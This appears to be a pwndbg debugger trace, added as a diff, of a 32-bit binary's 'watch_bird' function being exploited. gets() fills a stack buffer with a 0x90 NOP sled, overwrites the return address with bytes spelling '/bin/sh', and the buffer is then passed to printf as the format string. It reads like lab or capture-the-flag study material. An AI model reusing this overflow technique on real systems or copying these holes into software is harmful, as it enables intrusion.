+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 —▸ 0xffffc5b8 ◂— 0x0
+ ESP  0xffffc4d4 —▸ 0x804b008 ◂— 0x4b3430 /* '04K' */
+ EIP  0x804872d (watch_bird+58) ◂— push   eax
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x8048717 <watch_bird+36>    push   0x8048860
+   0x804871c <watch_bird+41>    call   puts@plt <0x80484c0>
+ 
+   0x8048721 <watch_bird+46>    add    esp, 0x10
+   0x8048724 <watch_bird+49>    sub    esp, 0xc
+   0x8048727 <watch_bird+52>    lea    eax, [ebp - 0xa4]
+ ► 0x804872d <watch_bird+58>    push   eax
+   0x804872e <watch_bird+59>    call   gets@plt <0x8048470>
+ 
+   0x8048733 <watch_bird+64>    add    esp, 0x10
+   0x8048736 <watch_bird+67>    sub    esp, 0xc
+   0x8048739 <watch_bird+70>    lea    eax, [ebp - 0xa4]
+   0x804873f <watch_bird+76>    push   eax
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4d4 —▸ 0x804b008 ◂— 0x4b3430 /* '04K' */
+01:0004│      0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+02:0008│      0xffffc4dc ◂— 0x2710
+03:000c│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+04:0010│ eax  0xffffc4e4 —▸ 0xf7f70af3 ◂— insd   dword ptr es:[edi], dx /* 'malloc(): memory corruption' */
+05:0014│      0xffffc4e8 ◂— 0x2
+06:0018│      0xffffc4ec ◂— 0x4
+07:001c│      0xffffc4f0 ◂— 0x20 /* ' ' */
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  804872d watch_bird+58
+   f 1  80487bc main+41
+   f 2 f7e2c647 __libc_start_main+247
+pwndbg> n
+0x0804872e in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffc4e4 —▸ 0xf7f70af3 ◂— insd   dword ptr es:[edi], dx /* 'malloc(): memory corruption' */
+ EBX  0x0
+ ECX  0xffffffff
+ EDX  0xf7fc8870 (_IO_stdfile_1_lock) ◂— 0
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 —▸ 0xffffc5b8 ◂— 0x0
+ ESP  0xffffc4d0 —▸ 0xffffc4e4 —▸ 0xf7f70af3 ◂— insd   dword ptr es:[edi], dx /* 'malloc(): memory corruption' */
+ EIP  0x804872e (watch_bird+59) —▸ 0xfffd3de8 ◂— 0xfffd3de8
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x804871c <watch_bird+41>    call   puts@plt <0x80484c0>
+ 
+   0x8048721 <watch_bird+46>    add    esp, 0x10
+   0x8048724 <watch_bird+49>    sub    esp, 0xc
+   0x8048727 <watch_bird+52>    lea    eax, [ebp - 0xa4]
+   0x804872d <watch_bird+58>    push   eax
+ ► 0x804872e <watch_bird+59>    call   gets@plt <0x8048470>
+        arg[0]: 0xffffc4e4 —▸ 0xf7f70af3 ◂— insd   dword ptr es:[edi], dx /* 'malloc(): memory corruption' */
+        arg[1]: 0x804b008 ◂— 0x4b3430 /* '04K' */
+        arg[2]: 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+        arg[3]: 0x2710
+ 
+   0x8048733 <watch_bird+64>    add    esp, 0x10
+   0x8048736 <watch_bird+67>    sub    esp, 0xc
+   0x8048739 <watch_bird+70>    lea    eax, [ebp - 0xa4]
+   0x804873f <watch_bird+76>    push   eax
+   0x8048740 <watch_bird+77>    call   printf@plt <0x8048450>
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4d0 —▸ 0xffffc4e4 —▸ 0xf7f70af3 ◂— insd   dword ptr es:[edi], dx /* 'malloc(): memory corruption' */
+01:0004│      0xffffc4d4 —▸ 0x804b008 ◂— 0x4b3430 /* '04K' */
+02:0008│      0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+03:000c│      0xffffc4dc ◂— 0x2710
+04:0010│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+05:0014│ eax  0xffffc4e4 —▸ 0xf7f70af3 ◂— insd   dword ptr es:[edi], dx /* 'malloc(): memory corruption' */
+06:0018│      0xffffc4e8 ◂— 0x2
+07:001c│      0xffffc4ec ◂— 0x4
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  804872e watch_bird+59
+   f 1  80487bc main+41
+   f 2 f7e2c647 __libc_start_main+247
+pwndbg> n
+0x08048733 in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffc4e4 ◂— 0x90909090
+ EBX  0x0
+ ECX  0xf7fc75a0 (_IO_2_1_stdin_) ◂— mov    byte ptr [eax], ah /* 0xfbad2088 */
+ EDX  0xf7fc887c (_IO_stdfile_0_lock) ◂— 0
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 ◂— 0x69622fff
+ ESP  0xffffc4d0 —▸ 0xffffc4e4 ◂— 0x90909090
+ EIP  0x8048733 (watch_bird+64) ◂— add    esp, 0x10
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x8048721 <watch_bird+46>    add    esp, 0x10
+   0x8048724 <watch_bird+49>    sub    esp, 0xc
+   0x8048727 <watch_bird+52>    lea    eax, [ebp - 0xa4]
+   0x804872d <watch_bird+58>    push   eax
+   0x804872e <watch_bird+59>    call   gets@plt <0x8048470>
+ 
+ ► 0x8048733 <watch_bird+64>    add    esp, 0x10
+   0x8048736 <watch_bird+67>    sub    esp, 0xc
+   0x8048739 <watch_bird+70>    lea    eax, [ebp - 0xa4]
+   0x804873f <watch_bird+76>    push   eax
+   0x8048740 <watch_bird+77>    call   printf@plt <0x8048450>
+ 
+   0x8048745 <watch_bird+82>    add    esp, 0x10
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4d0 —▸ 0xffffc4e4 ◂— 0x90909090
+01:0004│      0xffffc4d4 —▸ 0x804b008 ◂— 0x4b3430 /* '04K' */
+02:0008│      0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+03:000c│      0xffffc4dc ◂— 0x2710
+04:0010│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+05:0014│ eax  0xffffc4e4 ◂— 0x90909090
+... ↓
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  8048733 watch_bird+64
+   f 1 68732f6e
+pwndbg> n
+0x08048736 in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffc4e4 ◂— 0x90909090
+ EBX  0x0
+ ECX  0xf7fc75a0 (_IO_2_1_stdin_) ◂— mov    byte ptr [eax], ah /* 0xfbad2088 */
+ EDX  0xf7fc887c (_IO_stdfile_0_lock) ◂— 0
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 ◂— 0x69622fff
+ ESP  0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EIP  0x8048736 (watch_bird+67) ◂— sub    esp, 0xc
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x8048724 <watch_bird+49>    sub    esp, 0xc
+   0x8048727 <watch_bird+52>    lea    eax, [ebp - 0xa4]
+   0x804872d <watch_bird+58>    push   eax
+   0x804872e <watch_bird+59>    call   gets@plt <0x8048470>
+ 
+   0x8048733 <watch_bird+64>    add    esp, 0x10
+ ► 0x8048736 <watch_bird+67>    sub    esp, 0xc
+   0x8048739 <watch_bird+70>    lea    eax, [ebp - 0xa4]
+   0x804873f <watch_bird+76>    push   eax
+   0x8048740 <watch_bird+77>    call   printf@plt <0x8048450>
+ 
+   0x8048745 <watch_bird+82>    add    esp, 0x10
+   0x8048748 <watch_bird+85>    sub    esp, 8
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+01:0004│ eax  0xffffc4e4 ◂— 0x90909090
+... ↓
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  8048736 watch_bird+67
+   f 1 68732f6e
+pwndbg> n
+0x08048739 in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffc4e4 ◂— 0x90909090
+ EBX  0x0
+ ECX  0xf7fc75a0 (_IO_2_1_stdin_) ◂— mov    byte ptr [eax], ah /* 0xfbad2088 */
+ EDX  0xf7fc887c (_IO_stdfile_0_lock) ◂— 0
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 ◂— 0x69622fff
+ ESP  0xffffc4d4 —▸ 0x804b008 ◂— 0x4b3430 /* '04K' */
+ EIP  0x8048739 (watch_bird+70) ◂— lea    eax, [ebp - 0xa4]
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x8048727 <watch_bird+52>    lea    eax, [ebp - 0xa4]
+   0x804872d <watch_bird+58>    push   eax
+   0x804872e <watch_bird+59>    call   gets@plt <0x8048470>
+ 
+   0x8048733 <watch_bird+64>    add    esp, 0x10
+   0x8048736 <watch_bird+67>    sub    esp, 0xc
+ ► 0x8048739 <watch_bird+70>    lea    eax, [ebp - 0xa4]
+   0x804873f <watch_bird+76>    push   eax
+   0x8048740 <watch_bird+77>    call   printf@plt <0x8048450>
+ 
+   0x8048745 <watch_bird+82>    add    esp, 0x10
+   0x8048748 <watch_bird+85>    sub    esp, 8
+   0x804874b <watch_bird+88>    lea    eax, [ebp - 0x10]
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4d4 —▸ 0x804b008 ◂— 0x4b3430 /* '04K' */
+01:0004│      0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+02:0008│      0xffffc4dc ◂— 0x2710
+03:000c│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+04:0010│ eax  0xffffc4e4 ◂— 0x90909090
+... ↓
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  8048739 watch_bird+70
+   f 1 68732f6e
+pwndbg> n
+0x0804873f in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffc4e4 ◂— 0x90909090
+ EBX  0x0
+ ECX  0xf7fc75a0 (_IO_2_1_stdin_) ◂— mov    byte ptr [eax], ah /* 0xfbad2088 */
+ EDX  0xf7fc887c (_IO_stdfile_0_lock) ◂— 0
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 ◂— 0x69622fff
+ ESP  0xffffc4d4 —▸ 0x804b008 ◂— 0x4b3430 /* '04K' */
+ EIP  0x804873f (watch_bird+76) ◂— push   eax
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x804872d <watch_bird+58>    push   eax
+   0x804872e <watch_bird+59>    call   gets@plt <0x8048470>
+ 
+   0x8048733 <watch_bird+64>    add    esp, 0x10
+   0x8048736 <watch_bird+67>    sub    esp, 0xc
+   0x8048739 <watch_bird+70>    lea    eax, [ebp - 0xa4]
+ ► 0x804873f <watch_bird+76>    push   eax
+   0x8048740 <watch_bird+77>    call   printf@plt <0x8048450>
+ 
+   0x8048745 <watch_bird+82>    add    esp, 0x10
+   0x8048748 <watch_bird+85>    sub    esp, 8
+   0x804874b <watch_bird+88>    lea    eax, [ebp - 0x10]
+   0x804874e <watch_bird+91>    push   eax
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4d4 —▸ 0x804b008 ◂— 0x4b3430 /* '04K' */
+01:0004│      0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+02:0008│      0xffffc4dc ◂— 0x2710
+03:000c│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+04:0010│ eax  0xffffc4e4 ◂— 0x90909090
+... ↓
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  804873f watch_bird+76
+   f 1 68732f6e
+pwndbg> n
+0x08048740 in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffc4e4 ◂— 0x90909090
+ EBX  0x0
+ ECX  0xf7fc75a0 (_IO_2_1_stdin_) ◂— mov    byte ptr [eax], ah /* 0xfbad2088 */
+ EDX  0xf7fc887c (_IO_stdfile_0_lock) ◂— 0
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 ◂— 0x69622fff
+ ESP  0xffffc4d0 —▸ 0xffffc4e4 ◂— 0x90909090
+ EIP  0x8048740 (watch_bird+77) —▸ 0xfffd0be8 ◂— 0xfffd0be8
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x804872e <watch_bird+59>    call   gets@plt <0x8048470>
+ 
+   0x8048733 <watch_bird+64>    add    esp, 0x10
+   0x8048736 <watch_bird+67>    sub    esp, 0xc
+   0x8048739 <watch_bird+70>    lea    eax, [ebp - 0xa4]
+   0x804873f <watch_bird+76>    push   eax
+ ► 0x8048740 <watch_bird+77>    call   printf@plt <0x8048450>
+        format: 0xffffc4e4 ◂— 0x90909090
+        vararg: 0x804b008 ◂— 0x4b3430 /* '04K' */
+ 
+   0x8048745 <watch_bird+82>    add    esp, 0x10
+   0x8048748 <watch_bird+85>    sub    esp, 8
+   0x804874b <watch_bird+88>    lea    eax, [ebp - 0x10]
+   0x804874e <watch_bird+91>    push   eax
+   0x804874f <watch_bird+92>    push   dword ptr [ebp + 8]
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4d0 —▸ 0xffffc4e4 ◂— 0x90909090
+01:0004│      0xffffc4d4 —▸ 0x804b008 ◂— 0x4b3430 /* '04K' */
+02:0008│      0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+03:000c│      0xffffc4dc ◂— 0x2710
+04:0010│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+05:0014│ eax  0xffffc4e4 ◂— 0x90909090
+... ↓
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  8048740 watch_bird+77
+   f 1 68732f6e
+pwndbg> n
+0x08048745 in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xac
+ EBX  0x0
+ ECX  0x0
+ EDX  0xf7fc8870 (_IO_stdfile_1_lock) ◂— 0
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 ◂— 0x69622fff
+ ESP  0xffffc4d0 —▸ 0xffffc4e4 ◂— 0x90909090
+ EIP  0x8048745 (watch_bird+82) ◂— add    esp, 0x10
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x8048733 <watch_bird+64>    add    esp, 0x10
+   0x8048736 <watch_bird+67>    sub    esp, 0xc
+   0x8048739 <watch_bird+70>    lea    eax, [ebp - 0xa4]
+   0x804873f <watch_bird+76>    push   eax
+   0x8048740 <watch_bird+77>    call   printf@plt <0x8048450>
+ 
+ ► 0x8048745 <watch_bird+82>    add    esp, 0x10
+   0x8048748 <watch_bird+85>    sub    esp, 8
+   0x804874b <watch_bird+88>    lea    eax, [ebp - 0x10]
+   0x804874e <watch_bird+91>    push   eax
+   0x804874f <watch_bird+92>    push   dword ptr [ebp + 8]
+   0x8048752 <watch_bird+95>    call   strcmp@plt <0x8048440>
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4d0 —▸ 0xffffc4e4 ◂— 0x90909090
+01:0004│      0xffffc4d4 —▸ 0x804b008 ◂— 0x4b3430 /* '04K' */
+02:0008│      0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+03:000c│      0xffffc4dc ◂— 0x2710
+04:0010│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+05:0014│      0xffffc4e4 ◂— 0x90909090
+... ↓
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  8048745 watch_bird+82
+   f 1 68732f6e
+pwndbg> n
+0x08048748 in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xac
+ EBX  0x0
+ ECX  0x0
+ EDX  0xf7fc8870 (_IO_stdfile_1_lock) ◂— 0
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 ◂— 0x69622fff
+ ESP  0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EIP  0x8048748 (watch_bird+85) ◂— sub    esp, 8
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x8048736 <watch_bird+67>     sub    esp, 0xc
+   0x8048739 <watch_bird+70>     lea    eax, [ebp - 0xa4]
+   0x804873f <watch_bird+76>     push   eax
+   0x8048740 <watch_bird+77>     call   printf@plt <0x8048450>
+ 
+   0x8048745 <watch_bird+82>     add    esp, 0x10
+ ► 0x8048748 <watch_bird+85>     sub    esp, 8
+   0x804874b <watch_bird+88>     lea    eax, [ebp - 0x10]
+   0x804874e <watch_bird+91>     push   eax
+   0x804874f <watch_bird+92>     push   dword ptr [ebp + 8]
+   0x8048752 <watch_bird+95>     call   strcmp@plt <0x8048440>
+ 
+   0x8048757 <watch_bird+100>    add    esp, 0x10
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+01:0004│      0xffffc4e4 ◂— 0x90909090
+... ↓
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  8048748 watch_bird+85
+   f 1 68732f6e
+pwndbg> n
+0x0804874b in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xac
+ EBX  0x0
+ ECX  0x0
+ EDX  0xf7fc8870 (_IO_stdfile_1_lock) ◂— 0
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 ◂— 0x69622fff
+ ESP  0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+ EIP  0x804874b (watch_bird+88) ◂— lea    eax, [ebp - 0x10]
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x8048739 <watch_bird+70>     lea    eax, [ebp - 0xa4]
+   0x804873f <watch_bird+76>     push   eax
+   0x8048740 <watch_bird+77>     call   printf@plt <0x8048450>
+ 
+   0x8048745 <watch_bird+82>     add    esp, 0x10
+   0x8048748 <watch_bird+85>     sub    esp, 8
+ ► 0x804874b <watch_bird+88>     lea    eax, [ebp - 0x10]
+   0x804874e <watch_bird+91>     push   eax
+   0x804874f <watch_bird+92>     push   dword ptr [ebp + 8]
+   0x8048752 <watch_bird+95>     call   strcmp@plt <0x8048440>
+ 
+   0x8048757 <watch_bird+100>    add    esp, 0x10
+   0x804875a <watch_bird+103>    test   eax, eax
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+01:0004│      0xffffc4dc ◂— 0x2710
+02:0008│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+03:000c│      0xffffc4e4 ◂— 0x90909090
+... ↓
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  804874b watch_bird+88
+   f 1 68732f6e
+pwndbg> n
+0x0804874e in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffc578 ◂— 0xcd0c568d
+ EBX  0x0
+ ECX  0x0
+ EDX  0xf7fc8870 (_IO_stdfile_1_lock) ◂— 0
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 ◂— 0x69622fff
+ ESP  0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+ EIP  0x804874e (watch_bird+91) ◂— push   eax
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x804873f <watch_bird+76>     push   eax
+   0x8048740 <watch_bird+77>     call   printf@plt <0x8048450>
+ 
+   0x8048745 <watch_bird+82>     add    esp, 0x10
+   0x8048748 <watch_bird+85>     sub    esp, 8
+   0x804874b <watch_bird+88>     lea    eax, [ebp - 0x10]
+ ► 0x804874e <watch_bird+91>     push   eax
+   0x804874f <watch_bird+92>     push   dword ptr [ebp + 8]
+   0x8048752 <watch_bird+95>     call   strcmp@plt <0x8048440>
+ 
+   0x8048757 <watch_bird+100>    add    esp, 0x10
+   0x804875a <watch_bird+103>    test   eax, eax
+   0x804875c <watch_bird+105>    jne    watch_bird+115 <0x8048766>
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+01:0004│      0xffffc4dc ◂— 0x2710
+02:0008│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+03:000c│      0xffffc4e4 ◂— 0x90909090
+... ↓
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  804874e watch_bird+91
+   f 1 68732f6e
+pwndbg> n
+0x0804874f in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffc578 ◂— 0xcd0c568d
+ EBX  0x0
+ ECX  0x0
+ EDX  0xf7fc8870 (_IO_stdfile_1_lock) ◂— 0
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 ◂— 0x69622fff
+ ESP  0xffffc4d4 —▸ 0xffffc578 ◂— 0xcd0c568d
+ EIP  0x804874f (watch_bird+92) ◂— push   dword ptr [ebp + 8]
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x8048740 <watch_bird+77>     call   printf@plt <0x8048450>
+ 
+   0x8048745 <watch_bird+82>     add    esp, 0x10
+   0x8048748 <watch_bird+85>     sub    esp, 8
+   0x804874b <watch_bird+88>     lea    eax, [ebp - 0x10]
+   0x804874e <watch_bird+91>     push   eax
+ ► 0x804874f <watch_bird+92>     push   dword ptr [ebp + 8]
+   0x8048752 <watch_bird+95>     call   strcmp@plt <0x8048440>
+ 
+   0x8048757 <watch_bird+100>    add    esp, 0x10
+   0x804875a <watch_bird+103>    test   eax, eax
+   0x804875c <watch_bird+105>    jne    watch_bird+115 <0x8048766>
+ 
+   0x804875e <watch_bird+107>    lea    eax, [ebp - 0x10]
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4d4 —▸ 0xffffc578 ◂— 0xcd0c568d
+01:0004│      0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+02:0008│      0xffffc4dc ◂— 0x2710
+03:000c│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+04:0010│      0xffffc4e4 ◂— 0x90909090
+... ↓
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  804874f watch_bird+92
+   f 1 68732f6e
+pwndbg> n
+0x08048752 in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffc578 ◂— 0xcd0c568d
+ EBX  0x0
+ ECX  0x0
+ EDX  0xf7fc8870 (_IO_stdfile_1_lock) ◂— 0
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 ◂— 0x69622fff
+ ESP  0xffffc4d0 —▸ 0x804b000 ◂— 0x0
+ EIP  0x8048752 (watch_bird+95) —▸ 0xfffce9e8 ◂— 0xfffce9e8
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x8048745 <watch_bird+82>     add    esp, 0x10
+   0x8048748 <watch_bird+85>     sub    esp, 8
+   0x804874b <watch_bird+88>     lea    eax, [ebp - 0x10]
+   0x804874e <watch_bird+91>     push   eax
+   0x804874f <watch_bird+92>     push   dword ptr [ebp + 8]
+ ► 0x8048752 <watch_bird+95>     call   strcmp@plt <0x8048440>
+        s1: 0x804b000 ◂— 0x0
+        s2: 0xffffc578 ◂— 0xcd0c568d
+ 
+   0x8048757 <watch_bird+100>    add    esp, 0x10
+   0x804875a <watch_bird+103>    test   eax, eax
+   0x804875c <watch_bird+105>    jne    watch_bird+115 <0x8048766>
+ 
+   0x804875e <watch_bird+107>    lea    eax, [ebp - 0x10]
+   0x8048761 <watch_bird+110>    cmp    dword ptr [ebp - 0xc], eax
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4d0 —▸ 0x804b000 ◂— 0x0
+01:0004│      0xffffc4d4 —▸ 0xffffc578 ◂— 0xcd0c568d
+02:0008│      0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+03:000c│      0xffffc4dc ◂— 0x2710
+04:0010│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+05:0014│      0xffffc4e4 ◂— 0x90909090
+... ↓
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  8048752 watch_bird+95
+   f 1 68732f6e
+pwndbg> n
+0x08048757 in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
